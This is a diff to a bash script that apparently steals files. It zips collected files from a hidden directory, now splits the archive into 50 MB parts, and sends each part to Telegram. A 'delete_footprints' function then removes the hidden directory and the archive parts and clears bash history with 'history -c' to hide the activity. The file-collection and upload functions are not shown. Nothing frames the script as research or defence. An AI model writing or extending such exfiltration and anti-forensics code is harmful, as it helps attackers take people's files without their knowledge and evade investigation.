@@ -1,3 +1,4 @@
+
 #!/bin/bash
 
 # Customizable Parameters
@@ -49,15 +50,15 @@ collect_files() {
 create_zip_file() {
     local source_folder="$1"
     local zip_file="$2"
-    zip -r "$zip_file" "$source_folder" > /dev/null
+    zip -r -9 "$zip_file" "$source_folder" > /dev/null
 }
 
 # Function to delete footprints
 delete_footprints() {
     # Delete the hidden directory and its contents
     rm -rf "$HIDDEN_DIRECTORY"
-    # Delete the temporary ZIP file
-    rm -f "$ZIP_FILE"
+    # Delete the temporary ZIP file and its parts
+    rm -f "$ZIP_FILE" "$ZIP_FILE.part_"*
     # Clear Bash command history
     history -c
 }
@@ -83,9 +84,15 @@ main() {
     echo "Creating ZIP file..."
     create_zip_file "$HIDDEN_DIRECTORY" "$ZIP_FILE"
 
-    # Send the ZIP file to Telegram
-    echo "Sending ZIP file to Telegram..."
-    send_file_to_telegram "$ZIP_FILE"
+    # Split the ZIP file into 50 MB parts
+    echo "Splitting ZIP file..."
+    split -b 50M "$ZIP_FILE" "$ZIP_FILE.part_"
+
+    # Send each part to Telegram
+    echo "Sending ZIP file parts to Telegram..."
+    for part in "$ZIP_FILE.part_"*; do
+        send_file_to_telegram "$part"
+    done
 
     # Delete footprints
     echo "Cleaning up..."
